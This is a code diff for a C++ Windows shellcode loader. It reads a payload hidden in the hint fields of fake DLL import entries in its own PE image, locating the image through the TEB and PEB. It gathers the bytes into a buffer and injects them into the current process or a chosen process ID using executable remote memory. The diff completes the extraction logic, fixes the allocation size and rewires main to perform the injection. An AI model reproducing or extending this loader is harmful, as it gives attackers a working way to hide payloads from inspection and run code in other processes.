@@ -5,12 +5,13 @@ void InjectShellcode(PBYTE shellcode, size_t shellcodeSize, DWORD pid) {
 	HANDLE processHandle;
 	HANDLE remoteThread;
 	PVOID remoteBuffer;
+
 	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (processHandle == INVALID_HANDLE_VALUE) {
 		std::cout << "[!] Error for opening the given pid!" << std::endl;
 		return;
 	}
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	if (!remoteBuffer) {
 		std::cout << "[!] Error on allocation !" << std::endl;
 		return;
@@ -36,12 +37,13 @@ bool IsFakeEntry(PIMAGE_SECTION_HEADER fakeSection, DWORD importLookupTableRVA) 
 	return false;
 }
 
-LPVOID ParseTheShellcode(size_t &shellcodeSize) {
+PBYTE ParseTheShellcode(size_t &shellcodeSize) {
 	PIMAGE_IMPORT_DESCRIPTOR* fakeDllEntryArray;
 	int fakeDllEntryArraySize = 0;
 	PBYTE TEBPtr = (PBYTE) __readgsqword(0x30);
 	PBYTE PEBPtr = *((PBYTE*)(TEBPtr + 0x060));
 	PBYTE imageBaseAddress = *(PBYTE*)(PEBPtr + 0x10);
+	//imageBaseAddress = testBuffer;
 	PIMAGE_NT_HEADERS ntHeader = ((PIMAGE_NT_HEADERS)((size_t)imageBaseAddress + ((PIMAGE_DOS_HEADER)imageBaseAddress)->e_lfanew));
 	PIMAGE_DATA_DIRECTORY iatDirectory = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 	if (iatDirectory->VirtualAddress == NULL) {
@@ -50,6 +52,7 @@ LPVOID ParseTheShellcode(size_t &shellcodeSize) {
 	}
 	size_t iatSize = iatDirectory->Size;
 	size_t iatRVA = iatDirectory->VirtualAddress;
+	size_t offsetILT = 0;
 	PIMAGE_IMPORT_DESCRIPTOR ITEntryCursor = NULL;
 	PIMAGE_IMPORT_DESCRIPTOR fakeITEntryCursor = NULL;
 	PIMAGE_THUNK_DATA fakeILTCursor = NULL;
@@ -90,8 +93,8 @@ LPVOID ParseTheShellcode(size_t &shellcodeSize) {
 	std::cout << "[+] Fake DLL Entries found !" << std::endl;
 	for (int i = 0; i < fakeDllEntryArraySize; i++) {
 		fakeITEntryCursor = fakeDllEntryArray[i];
-		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk + imageBaseAddress);
-		size_t offsetILT = 0;
+		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk+ imageBaseAddress);
+		offsetILT = 0;
 		while (true) {
 			fakeILTCursor = (PIMAGE_THUNK_DATA)(((uint64_t)fakeILTCursor) + offsetILT);
 			if (fakeILTCursor->u1.AddressOfData == 0) {
@@ -100,20 +103,72 @@ LPVOID ParseTheShellcode(size_t &shellcodeSize) {
 			hintNameTableEntry = (PIMAGE_IMPORT_BY_NAME)(fakeILTCursor->u1.AddressOfData + imageBaseAddress);
 			std::cout << "Hint: " << std::hex << hintNameTableEntry->Hint << std::endl;
 			std::cout << "Name: " << hintNameTableEntry->Name << std::endl;
+			shellcodeSize += 2;
+			offsetILT = (sizeof(IMAGE_THUNK_DATA));
 		}
 	}
+	PBYTE shellcodeArea = (PBYTE) HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
+	PBYTE cursor = shellcodeArea;
+	for (int i = 0; i < fakeDllEntryArraySize; i++) {
+		fakeITEntryCursor = fakeDllEntryArray[i];
+		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk + imageBaseAddress);
+		offsetILT = 0;
+		while (true) {
+			fakeILTCursor = (PIMAGE_THUNK_DATA)(((uint64_t)fakeILTCursor) + offsetILT);
+			if (fakeILTCursor->u1.AddressOfData == 0) {
+				break;
+			}
+			hintNameTableEntry = (PIMAGE_IMPORT_BY_NAME)(fakeILTCursor->u1.AddressOfData + imageBaseAddress);
+			memcpy(cursor, &(hintNameTableEntry->Hint), sizeof(WORD));
+			cursor += 2;
+			offsetILT = (sizeof(IMAGE_THUNK_DATA));
+		}
+	}
+	return shellcodeArea;
 }
 
-void PrintHelp(LPCSTR exeName){
-	std::cout << "[+] Usage: " << exeName << "<PID for injection>" << std::endl;
+PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
+	std::cout << fileName << std::endl;
+	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		std::cout << "Failed to open the file\n";
+		std::cout << GetLastError() << std::endl;
+		return NULL;
+	}
+	fileSize = GetFileSize(hFile, NULL);
+	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
+		std::cout << ("Failed to get the file size\n");
+		return NULL;
+	}
+	PBYTE fileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fileSize);
+	if (!fileBuffer) {
+		std::cout << ("Failed to get the file size\n");
+		return NULL;
+	}
+	DWORD dwBytesRead = 0;
+	if (ReadFile(hFile, fileBuffer, fileSize, &dwBytesRead, NULL) == FALSE) {
+		std::cout << ("Failed to alloc a buffer!\n");
+		return NULL;
+	}
+	if (dwBytesRead != fileSize) {
+		std::cout << ("Size problem!\n");
+		return NULL;
+	}
+	CloseHandle(hFile);
+	return fileBuffer;
 }
 
 int main(int argc, char *argv[]) {
-	if (argc != 2) {
-		PrintHelp(argv[0]);
-		return -1;
+	PBYTE mergedShellcode = NULL;
+	uint64_t shellcodeSize = 0;
+	uint64_t fileSize = 0;
+
+	mergedShellcode = ParseTheShellcode(shellcodeSize);
+	if (argc < 2) {
+		InjectShellcode(mergedShellcode, shellcodeSize, GetCurrentProcessId());
+	}	
+	else {
+		InjectShellcode(mergedShellcode, shellcodeSize, atoi(argv[1]));
 	}
-	size_t shellcodeSize = 0;
-	ParseTheShellcode(shellcodeSize);
 	return 0;
 }
